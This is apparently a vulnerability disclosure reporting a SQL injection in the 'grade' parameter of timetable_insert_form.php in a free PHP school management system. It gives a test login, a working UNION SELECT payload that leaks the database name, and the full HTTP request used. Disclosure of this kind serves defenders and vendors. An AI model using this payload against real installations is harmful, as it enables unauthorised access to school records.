# Advanced School Management System v1.0 by itsourcecode.com has SQL injection

**Login account:** 

​		username：suarez081119@gmail.com

​		password：12345

**vendors:** https://itsourcecode.com/free-projects/php-project/advanced-school-management-system-in-php-with-source-code/

**Vulnerability url:** /school/view/timetable_insert_form.php?grade=

**Vulnerability location:** /school/view/timetable_insert_form.php

**[+] Payload:** /school/view/timetable_insert_form.php?grade=11%20union%20select%201%2cdatabase()%23

​	Leak place : grade

**Current database name:** std_db, length is 6

**Request package**：

```
GET /school/view/timetable_insert_form.php?grade=11%20union%20select%201%2cdatabase()%23 HTTP/1.1
Host: 10.12.171.4
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
Accept: */*
Referer: http://10.12.171.4/school/view/timetable.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=cp26rmntdlbhle8qiofns95sv7
Connection: close
```

**SQL injection result**：line 52 database name is displayed.

![sql_injection3](https://github.com/Renrao/bug_report/blob/master/blob/main/vendors/itsourcecode.com/advanced-school-management-system/images/sql_injection3.png)